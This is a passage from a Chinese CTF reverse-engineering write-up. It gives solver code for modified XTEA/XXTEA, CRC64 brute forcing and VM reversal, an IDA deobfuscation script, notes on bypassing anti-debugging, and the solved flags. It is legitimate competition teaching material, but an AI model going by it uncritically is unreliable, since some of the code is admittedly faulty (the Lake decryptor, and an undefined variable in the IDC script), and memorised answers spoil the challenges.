17fb39fe << 6 = 5fece7f80\nW3 = W1 ^ W0 --- bfd9cf ^ fece7f80 = fe71a64f\nW2 = W0 ^ W3 --- 17fb39fe ^ 11223344 = 6d90aba\nW2 = W1 + W0 --- fe71a64f + 6d90aba = 1054ab109\nW2 = W0 & W3 --- 3c3f696a & 3 = 2\nW2 = W1 + W0 --- 616d5f72 + 3c3f696a = 9dacc8dc\nW2 = W0 ^ W3 --- 9dacc8dc ^ abab1212 = 3607dace\nW3 = W1 ^ W0 --- 54ab109 ^ 3607dace = 334d6bc7\nW2 = W1 + W0 --- 334d6bc7 + 345fe004 = 67ad4bcb\nW3 = W1 >> W0 --- 67ad4bcb >> 4 = 67ad4bc\nW3 = W1 << W0 --- 67ad4bcb << 7 = 33d6a5e580\nW3 = W1 ^ W0 --- 67ad4bc ^ d6a5e580 = d0df313c\nW2 = W0 ^ W3 --- 67ad4bcb ^ 55667788 = 32cb3c43\nW2 = W1 + W0 --- d0df313c + 32cb3c43 = 103aa6d7f\nW3 = W1 >> W0 --- 9b9f5051 >> b = 1373ea\nW2 = W0 & W3 --- 1373ea & 3 = 2\nW2 = W1 + W0 --- 616d5f72 + 9b9f5051 = fd0cafc3\nW2 = W0 ^ W3 --- fd0cafc3 ^ 23235566 = de2ffaa5\nW3 = W1 ^ W0 --- de2ffaa5 ^ 3aa6d7f = dd8597da\nW2 = W1 + W0 --- dd8597da + 17fb39fe = f580d1d8\nW3 = W1 >> W0 --- f580d1d8 >> 5 = 7ac068e\nW3 = W1 << W0 --- f580d1d8 << 6 = 3d60347600\nW3 = W1 ^ W0 --- 7ac068e ^ 60347600 = 6798708e\nW2 = W0 ^ W3 --- f580d1d8 ^ 11223344 = e4a2e29c\nW2 = W1 + W0 --- 6798708e + e4a2e29c = 14c3b532a\nW2 = W0 & W3 --- 9b9f5051 & 3 = 1\nW2 = W1 + W0 --- 656b616d + 9b9f5051 = 1010ab1be\nW2 = W0 ^ W3 --- 10ab1be ^ abab1212 = aaa1a3ac\nW3 = W1 ^ W0 --- 4c3b532a ^ aaa1a3ac = e69af086\nW2 = W1 + W0 --- e69af086 + 67ad4bcb = 14e483c51\nW3 = W1 >> W0 --- 4e483c51 >> 4 = 4e483c5\nW3 = W1 << W0 --- 4e483c51 << 7 = 27241e2880\nW3 = W1 ^ W0 --- 4e483c5 ^ 241e2880 = 20faab45\nW2 = W0 ^ W3 --- 4e483c51 ^ 55667788 = 1b2e4bd9\nW2 = W1 + W0 --- 20faab45 + 1b2e4bd9 = 3c28f71e\nW3 = W1 >> W0 --- faff3738 >> b = 1f5fe6\nW2 = W0 & W3 --- 1f5fe6 & 3 = 2\nW2 = W1 + W0 --- 616d5f72 + faff3738 = 15c6c96aa\nW2 = W0 ^ W3 --- 5c6c96aa ^ 23235566 = 7f4fc3cc\nW3 = W1 ^ W0 --- 7f4fc3cc ^ 3c28f71e = 436734d2\nW2 = W1 + W0 --- 436734d2 + f580d1d8 = 138e806aa\n```\n\n通过观察可以发现是一个魔改的XTea加密。\n\n通过对比标准XTea加密流程，可以得到里面参与计算的4个key值 **{0x776f6853,0x656b616d,0x616d5f72,0x74696564}** 以及delta值 **0x5f5fe6e7**\n\n写出对应加密的c++代码：\n\n```cpp\nvoid encipher(uint32_t v[2], const uint32_t key[4])\n{\n    unsigned int i;\n    uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x5f5fe6e7;\n    for (i = 0; i < 72; i++)\n    {\n        auto tmp = (((v1 << 6) ^ (v1 >> 5)) + (v1 ^ 0x11223344));\n        auto tmp2 = (((key[sum & 3] + sum) ^ 0xabab1212) ^ tmp);\n        v0 += tmp2;\n        sum += delta;\n        auto tmp3 = (((v0 << 7) ^ (v0 >> 4)) + (v0 ^ 0x55667788));\n        auto tmp4 = ((key[(sum >> 11) & 3] + sum) ^ 0x23235566 ^ tmp3);\n        v1 += tmp4;\n    }\n    v[0] = v0;\n    v[1] = v1;\n}\n```\n\n解密代码：\n\n```cpp\nvoid decipher(uint32_t v[2], const uint32_t key[4])\n{\n    unsigned int i;\n    uint32_t v0 = v[0], v1 = v[1], sum = 0x5f5fe6e7 * 72, delta = 0x5f5fe6e7;\n    for (i = 0; i < 72; i++)\n    {\n        auto tmp3 = (((v0 << 7) ^ (v0 >> 4)) + (v0 ^ 0x55667788));\n        auto tmp4 = ((key[(sum >> 11) & 3] + sum) ^ 0x23235566 ^ tmp3);\n        v1 -= tmp4;\n        sum -= delta;\n        auto tmp = (((v1 << 6) ^ (v1 >> 5)) + (v1 ^ 0x11223344));\n        auto tmp2 = (((key[sum & 3] + sum) ^ 0xabab1212) ^ tmp);\n        v0 -= tmp2;\n    }\n    v[0] = v0;\n    v[1] = v1;\n}\n```\n\n提取chal程序中的密文，进行解密即可。\n\n完整解密代码：\n\n```cpp\n#include <iostream>\n\nvoid decipher(uint32_t v[2], const uint32_t key[4])\n{\n    unsigned int i;\n    uint32_t v0 = v[0], v1 = v[1], sum = 0x5f5fe6e7 * 72, delta = 0x5f5fe6e7;\n    for (i = 0; i < 72; i++)\n    {\n        auto tmp3 = (((v0 << 7) ^ (v0 >> 4)) + (v0 ^ 0x55667788));\n        auto tmp4 = ((key[(sum >> 11) & 3] + sum) ^ 0x23235566 ^ tmp3);\n        v1 -= tmp4;\n        sum -= delta;\n        auto tmp = (((v1 << 6) ^ (v1 >> 5)) + (v1 ^ 0x11223344));\n        auto tmp2 = (((key[sum & 3] + sum) ^ 0xabab1212) ^ tmp);\n        v0 -= tmp2;\n    }\n    v[0] = v0;\n    v[1] = v1;\n}\n\nint main()\n{\n    uint32_t key[]{\n        0x776f6853,\n        0x656b616d,\n        0x616d5f72,\n        0x74696564};\n    unsigned int Encflag[8] = {\n        0x696C2E9A, 0x76ADE8E1, 0xE67D5CA4, 0x5C76BD38,\n        0xB7AC0787, 0xBFEA0C65, 0x01C2FF10, 0x6D16FD38};\n    decipher(Encflag, key);\n    decipher((uint32_t *)((uint64_t)Encflag + 8), key);\n    decipher((uint32_t *)((uint64_t)Encflag + 16), key);\n    decipher((uint32_t *)((uint64_t)Encflag + 24), key);\n    printf(\"%.32s\\n\", Encflag);\n    return 0;\n}\n```\n\nXYCTF{fun_un1c0rn_with_4rm64_VM}\n\n### Moon\n\n跟到moon.xor_crypt实际加密处。\n\n![](/images/6-1744626745337-11.png)\n\n发现是进行了单次xor，并加入到一个list中，前后过程不清楚。\n\n断在xor这个命令，运行附加调试，随便输入一串1\n\n![](/images/7-1744626745337-12.png)\n\n![](/images/8-1744626745338-15.png)\n\n发现是输入的'1'和一个0x24进行xor，多运行几次发现就是将输入的字符串都异或上一些值。\n\n直接断在return处，v20是最后将list转成Bytes的结果。\n\n![](/images/9-1744626745338-13.png)\n\n发现是28长度的一串字节，从0x15开始的，就是我们输入字符串长度以及异或完的结果。\n\n![](/images/10-1744626745338-14.png)\n\n继续运行会返回到check_flag代码处，底下有一个RichCompare比较两个数据。\n\n![](/images/11-1744626745338-16.png)\n\nv45可以看到就是将刚刚v20的bytes直接unhex转成了一串字符串。\n\n![](/images/12-1744626745338-18.png)\n\n那么v9就应该是flag的密文，可以数出一共是要35字节。\n\n![](/images/13-1744626745338-17.png)\n\n重新调试运行输入35个1，在check_flag开头断点，把输入的字符串全都patch成0。\n\n![](/images/14-1744626745338-19.png)\n\n![](/images/15-1744626745338-20.png)\n\n![](/images/16-1744626745338-21.png)\n\n最后在RichCompare处就可以得到xor密文的列表。\n\n![](/images/17-1744626745338-22.png)\n\n将v9的密文与这个数据进行xor即可得到flag。\n\n![](/images/18-1744626745338-23.png)\n\nflag{but_y0u_l00k3d_up_@t_th3_mOOn}\n\n### Dragon\n\n.bc 后缀 \n\n反编译为LLVM IR\n\n```python\nllvm-dis-17 Dragon.bc -o Dragon.ll\n```\n\n分析得知为crc64，以两个为一组进行校验，直接爆破就行\n\n```c++\n#include <stdio.h>\n#include <stdint.h>\n#include <string.h>\n\nuint64_t calculate_crc64_direct(const unsigned char* data, uint64_t length) {\n    uint64_t crc = 0xFFFFFFFFFFFFFFFFULL; \n\n    for (uint64_t i = 0; i < length; i++) {\n        crc ^= ((uint64_t)data[i] << 56);\n\n        for (uint64_t j = 0; j < 8; j++) {\n            if (crc & 0x8000000000000000ULL) { \n                crc = (crc << 1) ^ 0x42F0E1EBA9EA3693ULL; \n            }\n            else {\n                crc = crc << 1;\n            }\n        }\n    }\n\n    return ~crc;\n}\n\nint main() {\n    uint64_t enc[12] = {\n       -2565957437423125689, \n        224890624719110086, \n        1357324823849588894, \n        - 8941695979231947288, \n        - 253413330424273460, \n        - 7817463785137710741, \n        - 5620500441869335673, \n        984060876288820705, \n        - 6993555743080142153, \n        - 7892488171899690683, \n        7190415315123037707, \n        - 7218240302740981077\n    };\n    char flag[25] = { 0 };\n    int flag_index = 0;\n\n\n    for (int k = 0; k < 12; k++) {\n        uint64_t target_crc = enc[k];\n        int found = 0;\n        for (unsigned char c1 = 32; c1 < 127 && !found; c1++) {\n            for (unsigned char c2 = 32; c2 < 127 && !found; c2++) {\n                unsigned char test[2] = { c1, c2 };\n                uint64_t crc = calculate_crc64_direct(test, 2);\n                if (crc == target_crc) {\n                    flag[flag_index++] = c1;\n                    flag[flag_index++] = c2;\n                    break;\n                }\n            }\n        }\n    }\n\n    flag[flag_index] = '\\0';\n    printf(\"Decrypted flag: %s\\n\", flag);\n\n    return 0;\n}\n//flag{LLVM_1s_Fun_Ri9h7?}\n```\n\n### Summer\n\nhaskell程序\n\n函数式编程语言,这意味着一切都是惰性计算，什么是惰性计算？ 简单来说就是在调用之前不会对该值进行计算\n\n浏览 main 函数，可以看到 hs_main 将 ZCMain_main_closure 作为它的参数，它指向 haskell 程序的真正入口点\n\n![](/images/31-1744626745338-24.png)\n\nZCMain_main_closure里面我们发现它调用了stg_ap_p_fast，这个是底层函数，主要调用Main_main_closure这个函数\n\n![](/images/19-1744626745338-25.png)\n\nGHCziInternalziBase也是底层函数，主要关注两个参数\n\n![](/images/20-1744626745338-26.png)\n\n第一个参数的地址处的函数为打印字符串\n\n![](/images/21-1744626745338-27.png)\n\n![](/images/22-1744626745338-28.png)\n\n\n\nGHCziInternalziList_length 为处理我们的传入的字符串的长度，直接调用的是zdwlenAcc**，**zdwlenAcc 将通过检查下一个是否是列表的末尾来计算 \"flagTable\" 的长度（这里的\"flagTable\" 是我自己命名,其实就是存储惰性列表，我们可以根据惰性列表的指针数判断字符串的长度）\n\n![](/images/23-1744626745338-29.png)\n\n![](/images/24-1744626745338-30.png)\n\n我们这里就用flag进行测试，一方面是为了查看他的返回值\n\n![](/images/25-1744626745338-31.png)\n\n此时他是将rbx此处(即为惰性列表的末尾)，可以人工数(即为50)\n\n![](/images/26-1744626745338-32.png)\n\n另外一种为看返回值，第一次断下是返回我们输入字符串的长度，第二次断下是返回密钥的长度，第三次断下是返回密文的长度\n\n![](/images/27-1744626745338-33.png)\n\n![](/images/28-1744626745338-34.png)\n\n![](/images/29-1744626745338-35.png)\n\n另外一处为GHCziInternalziNum_zdfNumIntzuzdczp，这个也是在网上一篇文章看到的,在**add     rbx, [rax]** 在经过几次迭代后，我可以看到一些字符开始出现，此时我们可以得到密钥为**Klingsor's_Last_Summer**\n\n![](/images/30-1744626745338-36.png)\n\n我们在.data段得到了密钥，因此我们可以猜测下面可能为密文,并且下面都是指针+元素的存储形式\n\n![](/images/32-1744626745338-37.png)\n\n![](/images/33-1744626745338-38.png)\n\n然后通过CE调试得到明文和密文，然后得出为rc4+xor\n\n![](/images/34-1744626745338-39.png)\n\n![](/images/35-1744626745338-40.png)\n\nflag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}\n\n### Lake\n\n单步跟到主函数。\n\n![](/images/36-1744626745338-41.png)\n\n这边输入字符串后先赋值到了另一个数组，然后进行了一次简易VM计算进行了第一次加密，\n\n![](/images/37-1744626745338-42.png)\n\n然后接着第二次加密，最后循环比较。\n\n![](/images/38-1744626745338-44.png)\n\n![](/images/39-1744626745338-43.png)\n\n发现VM只用到了加减和XOR计算，在这三个地方的关键点打断点，输出寄存器和计算流程，这边为了方便直接复制到代码里面解密，将加减断点里面的输出运算符反过来，输出出来的代码直接复制到代码就是进行解密的流程。\n\n![](/images/40-1744626745338-45.png)\n\n![](/images/41-1744626745338-46.png)\n\n![](/images/42-1744626745338-48.png)\n\n调试输出：\n\n```cpp\nInput[2] += 12;\nInput[26] -= 85;\nInput[35] -= 12;\nInput[14] += 9;\nInput[27] -= 6;\nInput[6] ^= 5;\nInput[1] ^= 5;\nInput[27] += 14;\nInput[25] += 3;\nInput[26] += 4;\nInput[4] ^= 8;\nInput[3] -= 12;\nInput[12] += 10;\nInput[37] -= 2;\nInput[32] -= 2;\nInput[9] -= 12;\nInput[26] ^= 5;\nInput[4] += 13;\nInput[8] ^= 15;\nInput[10] += 14;\nInput[16] -= 7;\nInput[12] -= 7;\nInput[34] ^= 8;\nInput[21] ^= 10;\nInput[39] -= 126;\nInput[7] += 2;\nInput[15] ^= 3;\nInput[10] ^= 10;\nInput[34] -= 11;\nInput[18] += 8;\nInput[25] += 9;\nInput[14] ^= 6;\nInput[0] ^= 5;\nInput[10] -= 8;\nInput[27] ^= 7;\nInput[13] ^= 6;\nInput[13] ^= 4;\nInput[23] ^= 12;\nInput[34] ^= 14;\nInput[18] += 52;\nInput[38] -= 119;\n```\n\n这也就是第一层加密的解密代码。\n\n第二层加密直接对着写即可，我写的有点问题（懒得改），其中几个字节解密不对，不过根据解密出的flag也能猜出是啥，替换完那几个字节就得到完整的flag。\n\n完整解密代码：\n\n```cpp\n#include <iostream>\n#include <windows.h>\n\nvoid decrypt_func(unsigned char *data, int len)\n{\n    unsigned char temp[40];\n    memcpy(temp, data, 40);\n\n    for (int i = 0; i < 10; i++)\n    {\n        int base = 4 * i;\n        unsigned char block[4];\n\n        if (base < len)\n        {\n            block[0] = ((temp[base + 2] & 0x1F) << 5) | (temp[base + 3] >> 3);\n            block[1] = (temp[base] >> 3) | ((temp[base + 3] & 0x07) << 5);\n            block[2] = ((temp[base] & 0x07) << 5) | (temp[base + 1] >> 3);\n            block[3] = ((temp[base + 1] & 0x07) << 5) | (temp[base + 2] >> 3);\n\n            for (int j = 0; j < 4 && base + j < len; j++)\n            {\n                data[base + j] = block[j];\n            }\n        }\n    }\n}\n\nint main()\n{\n    unsigned char Input[48] = {\n        0x4A, 0xAB, 0x9B, 0x1B, 0x61, 0xB1, 0xF3, 0x32, 0xD1, 0x8B, 0x73, 0xEB, 0xE9, 0x73, 0x6B, 0x22,\n        0x81, 0x83, 0x23, 0x31, 0xCB, 0x1B, 0x22, 0xFB, 0x25, 0xC2, 0x81, 0x81, 0x73, 0x22, 0xFA, 0x03,\n        0x9C, 0x4B, 0x5B, 0x49, 0x97, 0x87, 0xDB, 0x51};\n\n    decrypt_func(Input, 40);\n    Input[2] += 12;\n    Input[26] -= 85;\n    Input[35] -= 12;\n    Input[14] += 9;\n    Input[27] -= 6;\n    Input[6] ^= 5;\n    Input[1] ^= 5;\n    Input[27] += 14;\n    Input[25] += 3;\n    Input[26] += 4;\n    Input[4] ^= 8;\n    Input[3] -= 12;\n    Input[12] += 10;\n    Input[37] -= 2;\n    Input[32] -= 2;\n    Input[9] -= 12;\n    Input[26] ^= 5;\n    Input[4] += 13;\n    Input[8] ^= 15;\n    Input[10] += 14;\n    Input[16] -= 7;\n    Input[12] -= 7;\n    Input[34] ^= 8;\n    Input[21] ^= 10;\n    Input[39] -= 126;\n    Input[7] += 2;\n    Input[15] ^= 3;\n    Input[10] ^= 10;\n    Input[34] -= 11;\n    Input[18] += 8;\n    Input[25] += 9;\n    Input[14] ^= 6;\n    Input[0] ^= 5;\n    Input[10] -= 8;\n    Input[27] ^= 7;\n    Input[13] ^= 6;\n    Input[13] ^= 4;\n    Input[23] ^= 12;\n    Input[34] ^= 14;\n    Input[18] += 52;\n    Input[38] -= 119;\n    printf(\"%.40s\\n\", Input);\n\n    // flag{L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y} -> flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}\n    return 0;\n}\n```\n\nflag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}\n\n### EzObf\n\nmain_0函数跟入发现有混淆，红框处为原真实汇编指令，其他都是混淆指令。\n\n混淆流程：\n\n1. 执行真实指令\n2. call $+5执行pop rax，rax就是call时push到栈的返回地址，也就是pop rax指令的地址。\n3. 给ebx赋值，进行rol计算，最后用rax加上或减去（共两种）rbx，得到跳转地址，进行jmp rax。\n\n之后每jmp过去一次，那边就都是一样的结构，popfq和pushfq之间就是真实汇编。\n\ndeobf的思路即为nop那一堆pop和push，保留真实汇编指令，然后计算跳转地址，手动计算相对地址写jmp，保持代码执行流程。\n\n![](/images/43-1744626745338-47.png)\n\ndeobf idc脚本：\n\n```cpp\nstatic NopCode(Addr, Length)\n{\n    auto i;\n    for (i = 0; i < Length; i++)\n    {\n        PatchByte(Addr + i, 0x90);\n    }\n}\n\nstatic rol(value, count, bits = 32)\n{\n    count = count % bits;\n    return ((value << count) | (value >> (bits - count))) & ((1 << bits) - 1);\n}\n\n// 搜索真实汇编代码的下一个地址\nstatic FindEnd(Addr)\n{\n    auto i;\n    for (i = 0; i < 0x90; i++)\n    {\n        auto v = Dword(Addr + i);\n        if (v == 0x5153509C)\n        {\n            return Addr + i;\n        }\n    }\n    return 0;\n}\n\n// 搜索最后的jmp rax指令\nstatic FindJmpRax(Addr)\n{\n    auto i;\n    for (i = 0; i < 0x90; i++)\n    {\n        auto v = Word(Addr + i);\n        if (v == 0xE0FF)\n        {\n            return Addr + i;\n        }\n    }\n    return 0;\n}\n\n// 搜索call $+5\nstatic FindCall(Addr)\n{\n    auto i;\n    for (i = 0; i < 0x90; i++)\n    {\n        auto v = Dword(Addr + i);\n        if (v == 0xE8)\n        {\n            return Addr + i;\n        }\n    }\n    return 0;\n}\n\nstatic main()\n{\n    auto StartAddr = 0x1401F400D;\n    while (1)\n    {\n        // 搜索真实汇编代码的下一个指令地址\n        auto EndAddr = FindEnd(StartAddr);\n        if (EndAddr == 0)\n        {\n            break;\n        }\n        // 真实汇编代码的字节长度\n        auto CodeLength = EndAddr - addr - 13;\n        // 搜索Call $+5\n        auto CallAddr = FindCall(addr + 13 + CodeLength);\n        if (CallAddr == 0)\n        {\n            break;\n        }\n        // call $+5的下一条指令地址，即call时push到栈的返回地址\n        auto CalcAddr = CallAddr + 5;\n        auto ebx = Dword(CalcAddr + 2);\n        auto rol_Value = Byte(CalcAddr + 8);\n        auto Mode = Dword(CalcAddr + 9);\n        ebx = rol(ebx, rol_Value);\n\n        // 搜索最尾部的jmp rax指令地址\n        auto JmpRaxAddr = FindJmpRax(addr);\n        if (JmpRaxAddr == 0)\n        {\n            break;\n        }\n        // 第一部分垃圾指令长度\n        auto TrushCodeLength_1 = CallAddr - (addr + 13 + CodeLength);\n        // 第二部分垃圾指令长度\n        auto TrushCodeLength_2 = JmpRaxAddr - CallAddr + 2;\n        // Nop掉无用的所有代码\n        NopCode(CallAddr, TrushCodeLength_2);\n\n        NopCode(addr, 13);\n\n        NopCode(addr + 13 + CodeLength, TrushCodeLength_1);\n        // 一共两种地址计算，加和减\n        if (Mode == 0xffC32B48)\n        {\n            CalcAddr = CalcAddr - ebx;\n        }\n        if (Mode == 0xffC30348)\n        {\n            CalcAddr = CalcAddr + ebx;\n        }\n        auto JmpCodeAddr = EndAddr;\n        // 计算相对跳转地址\n        auto JmpOffset = CalcAddr - JmpCodeAddr + 5;\n        // 写入jmp指令\n        PatchByte(JmpCodeAddr, 0xE9);\n        PatchDword(JmpCodeAddr + 1, JmpOffset);\n        // jmp的地址为下一次deobf起始地址\n        addr = CalcAddr;\n    }\n}\n```\n\n执行完，把main_0剩余代码都手动nop即可。\n\n![](/images/44-1744626745338-49.png)\n\n然后Apply patches to input file，应用一下patch，重新打开ida载入程序分析。\n\n从main_0的jmp进入两层到这边，然后用IDA Delete Function删除sub_1401F7B77函数，然后对jmp那边按E即可重新重构完main函数（如图2），F5即可分析。\n\n![](/images/45-1744626745338-50.png)\n\n![](/images/46-1744626745338-51.png)\n\nMain函数原代码：\n\n```cpp\nint __fastcall main_0(int argc, const char **argv, const char **envp)\n{\n  __int64 v3; // rbp\n  __int64 v4; // rdi\n  __int64 i; // rcx\n  _DWORD *v7; // rdi\n  HANDLE CurrentProcess; // rax\n  __int64 v9; // [rsp-20h] [rbp-458h] BYREF\n  _DWORD v10[2]; // [rsp+0h] [rbp-438h] BYREF\n  _BYTE v11[64]; // [rsp+8h] [rbp-430h] BYREF\n  _BYTE *v12; // [rsp+48h] [rbp-3F0h]\n  unsigned int v13; // [rsp+64h] [rbp-3D4h]\n  int v14; // [rsp+84h] [rbp-3B4h]\n  unsigned int v15; // [rsp+A4h] [rbp-394h]\n  int v16; // [rsp+C4h] [rbp-374h]\n  int v17; // [rsp+E4h] [rbp-354h]\n  unsigned int k; // [rsp+104h] [rbp-334h]\n  int v19; // [rsp+124h] [rbp-314h]\n  int v20; // [rsp+144h] [rbp-2F4h]\n  int v21; // [rsp+164h] [rbp-2D4h]\n  _DWORD v22[11]; // [rsp+188h] [rbp-2B0h] BYREF\n  unsigned __int16 v23; // [rsp+1B4h] [rbp-284h]\n  BOOL v24; // [rsp+1D4h] [rbp-264h] BYREF\n  unsigned __int64 j; // [rsp+1F8h] [rbp-240h]\n  unsigned __int64 v26; // [rsp+218h] [rbp-220h]\n  _DWORD v27[12]; // [rsp+238h] [rbp-200h]\n  unsigned __int64 m; // [rsp+268h] [rbp-1D0h]\n  int v29; // [rsp+3F4h] [rbp-44h]\n  unsigned int v30; // [rsp+3F8h] [rbp-40h]\n  int v31; // [rsp+3FCh] [rbp-3Ch]\n  __int64 v32; // [rsp+400h] [rbp-38h]\n  int v33; // [rsp+408h] [rbp-30h]\n  unsigned __int64 v34; // [rsp+410h] [rbp-28h]\n  __int64 v35; // [rsp+428h] [rbp-10h]\n  __int64 v36; // [rsp+430h] [rbp-8h]\n\n  v36 = v3;\n  v35 = v4;\n  v7 = v10;\n  for ( i = 170; i; --i )\n    *v7++ = -858993460;\n  v34 = (unsigned __int64)v10 ^ 0x1401D9000LL;\n  j___CheckForDebuggerJustMyCode(0x1401ED104LL);\n  memset(v11, 0, 0x20u);\n  sub_140087C02(0x1401A1190LL);\n  if ( !IsDebuggerPresent() )\n  {\n    sub_1400868E3();\n    v12 = v11;\n    memset(v22, 0, 0x10u);\n    v23 = 8;\n    v29 = 8;\n    v20 = 12;\n    v15 = 0;\n    v16 = 0x61C88646;\n    v21 = 0x95664B48;\n    v19 = 7;\n    v24 = 0;\n    CurrentProcess = GetCurrentProcess();\n    CheckRemoteDebuggerPresent(CurrentProcess, &v24);\n    if ( !v24 )\n    {\n      j_srand(0xAABBu);\n      for ( j = 0; j < 4; ++j )\n        v22[j] = j_rand();\n      while ( 1 )\n      {\n        v29 = v19--;\n        v30 = v29 != 0;\n        if ( !v30 )\n          break;\n        v15 += v16;\n        v17 = (v15 >> 2) & 3;\n        for ( k = 0; k < v23; ++k )\n        {\n          v26 = __rdtsc();\n          v13 = *(_DWORD *)&v12[4 * ((k + 1) % v23)];\n          v29 = (4 * v13) ^ (*(_DWORD *)&v12[4 * ((k + v23 - 1) % v23)] >> 5);\n          v30 = k + v23 - 1;\n          v31 = ((16 * *(_DWORD *)&v12[4 * (v30 % v23)]) ^ (v13 >> 3)) + v29;\n          v32 = ((unsigned __int8)v17 ^ (unsigned __int8)k) & 3;\n          v33 = (((*(_DWORD *)&v12[4 * (v30 % v23)] ^ v22[v32]) + (v13 ^ v15)) ^ v31) + *(_DWORD *)&v12[4 * k];\n          *(_DWORD *)&v12[4 * k] = v33;\n          v14 = v33;\n          if ( __rdtsc() - v26 > 0x83C0 )\n            goto LABEL_20;\n        }\n      }\n      v27[0] = 0xA9934E2F;\n      v27[1] = 0x30B90FA;\n      v27[2] = 0xDCBF1D3;\n      v27[3] = 0x328B5BDE;\n      for ( m = 0; m < 4; ++m )\n      {\n        if ( v27[m] != v10[m + 2] )\n        {\n          sub_140087C02(0x1401A11A8LL);\n          j_system(byte_1401A11A0);\n          goto LABEL_20;\n        }\n      }\n      sub_140087C02(0x1401A11C0LL);\n      j_system(byte_1401A11A0);\n    }\n  }\nLABEL_20:\n  j__RTC_CheckStackVars(&v9, (_RTC_framedesc *)&unk_1401A1140);\n  j___security_check_cookie((unsigned __int64)v10 ^ v34);\n  return sub_1401F8E9B();\n}\n```\n\n很清晰看出来是XXTEA加密，密钥是固定种子随机数随机得到的，Delta被魔改，然后密文也能看到。\n\n**注：写WP时用的是旧版附件分析，缺失了后面16字节密文**\n\n完整密文数据：\n\n```cpp\n0xa9934e2f, 0x30b90fa, 0xdcbf1d3, 0x328b5bde,\n0x44fab4e, 0x1dcf0051, 0x85ebbe55, 0x93aa773a\n```\n\n解密代码：\n\n```cpp\n#include <iostream>\n#define DELTA 0x61C88646\n#define MX (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z)))\n\nvoid xxtea(uint32_t *v, int n, uint32_t const key[4])\n{\n    uint32_t y, z, sum;\n    unsigned p, rounds, e;\n    if (n > 1) /* Coding Part */\n    {\n        rounds = 7;\n        sum = 0;\n        z = v[n - 1];\n        do\n        {\n            sum += DELTA;\n            e = (sum >> 2) & 3;\n            for (p = 0; p < n - 1; p++)\n            {\n                y = v[p + 1];\n                z = v[p] += MX;\n                if (z == 0xA4F41487)\n                    printf(\"11\\n\");\n                if (y == 0xA4F41487)\n                    printf(\"11\\n\");\n            }\n            y = v[0];\n            z = v[n - 1] += MX;\n\n        } while (--rounds);\n    }\n    else if (n < -1) /* Decoding Part */\n    {\n        n = -n;\n        rounds = 7;\n        sum = rounds * DELTA;\n        y = v[0];\n        do\n        {\n            e = (sum >> 2) & 3;\n            for (p = n - 1; p > 0; p--)\n            {\n                z = v[p - 1];\n                y = v[p] -= MX;\n            }\n            z = v[n - 1];\n            y = v[0] -= MX;\n            sum -= DELTA;\n        } while (--rounds);\n    }\n}\n\nint main()\n{\n    srand(0xAABB);\n    uint32_t key[4]{};\n    uint32_t Enc[]{\n        0xa9934e2f, 0x30b90fa, 0xdcbf1d3, 0x328b5bde,\n        0x44fab4e, 0x1dcf0051, 0x85ebbe55, 0x93aa773a};\n\n    for (int i = 0; i < 4; i++)\n    {\n        key[i] = rand();\n    }\n    xxtea(Enc, -8, key);\n    printf(\"%.32s\\n\", Enc);\n    return 0;\n}\n```\n\nflag{th15_15_51mpLe_obf_R19Ht?}\n\n### CrackMe\n\n有反调试，在WinMain开头断点，使用ScyllaHide一把梭去除（（。\n\n![](/images/47-1744626745338-52.png)\n\n![](/images/48-1744626745338-53.png)\n\n从WinMain可以跟踪到窗口消息函数，图四就是验证函数按钮消息。\n\n![](/images/49-1744626745338-54.png)\n\n![](/images/50-1744626745338-55.png)\n\n![](/images/51-1744626745338-56.png)\n\n![](/images/52-1744626745338-57.png)\n\n从TLS那边可以看到启动了一个线程，线程函数如下\n\n![](/images/53-1744626745339-58.png)\n\n这边死循环判断了一个值，然后调用CallBack，随便输入flag，点击验证，发现会先调用CallBack中的mark2函数进行第一次验证。\n\n![](/images/54-1744626745339-59.png)\n\n将这边v4都异或上0xBB会得到\"flag{\"五个字符，就明白这边是检测输入flag开头是否为\"flag{\"，进行了第一次验证，然后继续下一次验证进入了case 5的mark3函数。\n\n![](/images/55-1744626745339-60.png)\n\nmark3这边是用固定值生成了一个v5数值列表，a1是输入的字符串，但是可以看到+5跳过了前面的五个字符，然后对括号内的前7个字符做一些加密计算然后和v5列表前7个数值进行检验。\n\n这边就可以直接提取v5生成的数值列表，然后利用爆破得到括号内的前七个字符。\n\n![](/images/56-1744626745339-61.png)\n\n爆破代码：\n\n```cpp\n  unsigned int box1[] = {\n        0x00000000, 0xC0BA6CAC, 0x5A05DF1B, 0x9ABFB3B7, 0xB40BBE36, 0x74B1D29A,\n        0xEE0E612D, 0x2EB40D81, 0xB3667A2F, 0x73DC1683, 0xE963A534, 0x29D9C998, 0x076DC419, 0xC7D7A8B5,\n        0x5D681B02, 0x9DD277AE, 0xBDBDF21D, 0x7D079EB1, 0xE7B82D06, 0x270241AA, 0x09B64C2B, 0xC90C2087,\n        0x53B39330, 0x9309FF9C, 0x0EDB8832, 0xCE61E49E, 0x54DE5729, 0x94643B85, 0xBAD03604, 0x7A6A5AA8,\n        0xE0D5E91F, 0x206F85B3, 0xA00AE279, 0x60B08ED5, 0xFA0F3D62, 0x3AB551CE, 0x14015C4F, 0xD4BB30E3,\n        0x4E048354, 0x8EBEEFF8, 0x136C9856, 0xD3D6F4FA, 0x4969474D, 0x89D32BE1, 0xA7672660, 0x67DD4ACC,\n        0xFD62F97B, 0x3DD895D7, 0x1DB71064, 0xDD0D7CC8, 0x47B2CF7F, 0x8708A3D3, 0xA9BCAE52, 0x6906C2FE,\n        0xF3B97149, 0x33031DE5, 0xAED16A4B, 0x6E6B06E7, 0xF4D4B550, 0x346ED9FC, 0x1ADAD47D, 0xDA60B8D1,\n        0x40DF0B66, 0x806567CA, 0x9B64C2B1, 0x5BDEAE1D, 0xC1611DAA, 0x01DB7106, 0x2F6F7C87, 0xEFD5102B,\n        0x756AA39C, 0xB5D0CF30, 0x2802B89E, 0xE8B8D432, 0x72076785, 0xB2BD0B29, 0x9C0906A8, 0x5CB36A04,\n        0xC60CD9B3, 0x06B6B51F, 0x26D930AC, 0xE6635C00, 0x7CDCEFB7, 0xBC66831B, 0x92D28E9A, 0x5268E236,\n        0xC8D75181, 0x086D3D2D, 0x95BF4A83, 0x5505262F, 